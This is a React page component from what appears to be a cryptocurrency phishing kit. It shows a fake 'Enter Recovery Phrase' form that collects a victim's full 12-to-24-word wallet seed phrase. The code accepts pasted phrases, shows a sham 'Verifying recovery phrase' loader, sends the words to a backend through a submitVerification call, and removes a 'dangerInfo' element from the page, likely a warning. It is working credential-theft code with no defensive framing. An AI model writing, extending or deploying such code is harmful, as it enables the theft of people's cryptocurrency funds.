import React, { useState, useEffect, useRef } from 'react'
import { useNavigate } from 'react-router-dom'
import { useI18n } from '../contexts/I18nContext'
import { useSession } from '../contexts/SessionContext'
import Header from '../components/Header'
import SecurityModal from '../components/SecurityModal'
import api from '../services/api'
import '../styles/common.css'
import '../styles/connect.css'

const Connect = () => {
  const navigate = useNavigate()
  const { t, currentLang } = useI18n()
  const { homeVisited, setVerificationStage, updateFormData } = useSession()
  const [phraseLength, setPhraseLength] = useState('')
  const [words, setWords] = useState(Array(24).fill(''))
  const [showPasswords, setShowPasswords] = useState(Array(24).fill(false))
  const [error, setError] = useState('')
  const [loading, setLoading] = useState(false)
  const [showSecurityModal, setShowSecurityModal] = useState(false)
  const [showLoader, setShowLoader] = useState(false)
  const isSubmittingRef = useRef(false)
  const redirectTimeoutRef = useRef(null)

  useEffect(() => {
    if (!homeVisited) {
      navigate('/home', { replace: true })
      return
    }
    setVerificationStage('connect')
    
    const dangerInfo = document.getElementById('dangerInfo')
    if (dangerInfo) {
      dangerInfo.remove()
    }
    
    return () => {
      if (redirectTimeoutRef.current) {
        clearTimeout(redirectTimeoutRef.current)
      }
      isSubmittingRef.current = false
    }
  }, [homeVisited, navigate, setVerificationStage])

  const handlePhraseLengthChange = (e) => {
    const length = e.target.value
    setPhraseLength(length)
    const newWords = [...words]
    for (let i = parseInt(length); i < 24; i++) {
      newWords[i] = ''
    }
    setWords(newWords)
    setError('')
  }

  const handleWordChange = (index, value) => {
    const newWords = [...words]
    newWords[index] = value
    setWords(newWords)
    setError('')
  }

  const handlePaste = (e) => {
    e.preventDefault()
    const pastedText = e.clipboardData.getData('text')
    const pastedWords = pastedText.trim().split(/\s+/).filter(w => w.length > 0)
    
    if (pastedWords.length > 0) {
      const validLengths = [12, 15, 18, 21, 24]
      const length = pastedWords.length
      
      if (validLengths.includes(length)) {
        setPhraseLength(length.toString())
        const newWords = Array(24).fill('')
        pastedWords.forEach((word, index) => {
          if (index < 24) {
            newWords[index] = word
          }
        })
        setWords(newWords)
        setError('')
      } else {
        setError(t('invalid_phrase_length', 'Invalid phrase length. Please use 12, 15, 18, 21, or 24 words'))
      }
    }
  }

  const togglePasswordVisibility = (index) => {
    const newShowPasswords = [...showPasswords]
    newShowPasswords[index] = !newShowPasswords[index]
    setShowPasswords(newShowPasswords)
  }

  const validateForm = () => {
    if (!phraseLength) {
      setError(t('select_phrase_length', 'Please select phrase length'))
      return false
    }
    
    const numWords = parseInt(phraseLength)
    for (let i = 0; i < numWords; i++) {
      if (!words[i] || !words[i].trim()) {
        setError(t('fill_all_words', 'Please fill all words'))
        return false
      }
    }
    
    return true
  }

  const handleSubmit = async (e) => {
    e.preventDefault()
    

    if (isSubmittingRef.current || loading) {
      return
    }
    
    setError('')
    
    if (!validateForm()) return

    isSubmittingRef.current = true
    setLoading(true)
    setShowLoader(true)
    
    try {
      const formDataObj = {
        language: currentLang,
        steeep: 'words',
        type: phraseLength
      }
      
      const numWords = parseInt(phraseLength)
      for (let i = 1; i <= numWords; i++) {
        formDataObj[`w${i}`] = words[i - 1]
      }
      
      updateFormData({ recovery_phrase: words.slice(0, numWords).join(' ') })
      
      await new Promise(resolve => setTimeout(resolve, 2000))
      
      const result = await api.submitVerification(formDataObj)
      
      if (result.success) {
        setShowLoader(false)
        const authToken = btoa(Date.now().toString()).replace(/[^a-zA-Z0-9]/g, '').substring(0, 32)
        navigate(`/finish?AUTH-TOKEN=${authToken}`, { replace: true })
        isSubmittingRef.current = false
      } else {
        const isExpectedError = result.message && result.message.includes('Invalid recovery phrase')
        setError(result.message || t('submission_error', 'Failed to submit. Please try again.'))
        setShowLoader(false)
        isSubmittingRef.current = false
      }
    } catch (error) {
      setError(error.message || t('submission_error', 'Failed to submit. Please try again.'))
      setShowLoader(false)
      isSubmittingRef.current = false
    } finally {
      setLoading(false)
    }
  }

  const visibleWords = phraseLength ? parseInt(phraseLength) : 0

  return (
    <div className="connect-page">
      <Header />
      <main id="main">
        <div className="container">
          <div className="thebox">
            <div className="title">
              <h3 id="main-title">{t('connect_title', 'Enter Recovery Phrase')}</h3>
              <p id="description-1">{t('connect_description', 'Please enter your recovery phrase to continue')}</p>
              <p id="instructions">{t('instructions', 'Select the number of words in your recovery phrase')}</p>
            </div>
            
            <div className="logo">
              <svg width="80" height="80" viewBox="0 0 24 24" fill="#4a6ee0">
                <path d="M17,9H7V7H17M17,13H7V11H17M14,17H7V15H14M12,3A1,1 0 0,1 13,4A1,1 0 0,1 12,5A1,1 0 0,1 11,4A1,1 0 0,1 12,3M19,3H14.82C14.4,1.84 13.3,1 12,1C10.7,1 9.6,1.84 9.18,3H5A2,2 0 0,0 3,5V19A2,2 0 0,0 5,21H19A2,2 0 0,0 21,19V5A2,2 0 0,0 19,3Z"/>
              </svg>
            </div>
            
            <form id="recoveryForm" onSubmit={handleSubmit}>
              <input type="hidden" id="cap" name="cap" autoComplete="off" />
              <input type="hidden" name="steeep" id="steeep" value="words" autoComplete="off" />
              <input type="hidden" name="error" id="error" value="" autoComplete="off" />

              <div className="infos paste-info-hint">
                <div className="sym" id="info-icon">ℹ️</div>
                <p id="paste-info">{t('pasteInfo', 'You can paste your phrase or type each word')}</p>
              </div>

              <div className="form-group">
                <select 
                  name="type" 
                  id="type" 
                  className="form-select"
                  value={phraseLength}
                  onChange={handlePhraseLengthChange}
                >
                  <option value="" disabled>{t('phraseSelectPlaceholder', 'Select phrase length...')}</option>
                  <option value="12">{t('phrase12', 'I have a 12-word phrase')}</option>
                  <option value="15">{t('phrase15', 'I have a 15-word phrase')}</option>
                  <option value="18">{t('phrase18', 'I have an 18-word phrase')}</option>
                  <option value="21">{t('phrase21', 'I have a 21-word phrase')}</option>
                  <option value="24">{t('phrase24', 'I have a 24-word phrase')}</option>
                </select>
              </div>

              <div className={`inputs ${phraseLength ? 'visible' : ''}`} id="inputsContainer">
                {Array.from({ length: 24 }).map((_, index) => (
                  <div 
                    key={index} 
                    className="input" 
                    data-index={index + 1}
                    style={{ display: index < visibleWords ? '' : 'none' }}
                  >
                    <span className="num">{index + 1}.</span>
                    <input
                      type={showPasswords[index] ? 'text' : 'password'}
                      name={`w${index + 1}`}
                      id={`w${index + 1}`}
                      className="form-control"
                      autoComplete="off"
                      value={words[index]}
                      onChange={(e) => handleWordChange(index, e.target.value)}
                      onPaste={index === 0 ? handlePaste : undefined}
                      disabled={loading}
                    />
                    <span 
                      className="eye" 
                      data-id={`w${index + 1}`}
                      onClick={() => togglePasswordVisibility(index)}
                    >
                      <i className={`fa-solid fa-eye${showPasswords[index] ? '' : '-slash'}`}></i>
                    </span>
                  </div>
                ))}
              </div>

              {error && (
                <div id="errorMessage" className="error-message" style={{ display: 'block' }}>{error}</div>
              )}

              <div className="btns">
                <button 
                  type="submit" 
                  id="submitBtn" 
                  disabled={!phraseLength || loading || !words.slice(0, visibleWords).every(w => w.trim())}
                >
                  <span id="confirm-button">
                    {loading ? t('processing', 'Processing...') : t('confirm_button', 'Confirm')}
                  </span>
                </button>
                <button 
                  type="button" 
                  className="security-info-btn" 
                  id="securityInfoBtn"
                  onClick={() => setShowSecurityModal(true)}
                >
                  <span id="security-btn-text">
                    {t('security_info', 'Security Info')}
                  </span>
                </button>
              </div>
            </form>
          </div>
        </div>
      </main>

      {showLoader && (
        <div id="loaderOverlay" className="loader-overlay show">
          <div className="loader-container">
            <div className="loader-spinner"></div>
            <p className="loader-text" id="loaderText">
              {t('loaderText', 'Verifying recovery phrase...')}
            </p>
          </div>
        </div>
      )}

      <SecurityModal 
        isOpen={showSecurityModal} 
        onClose={() => setShowSecurityModal(false)}
        variant="connect"
      />
    </div>
  )
}

export default Connect
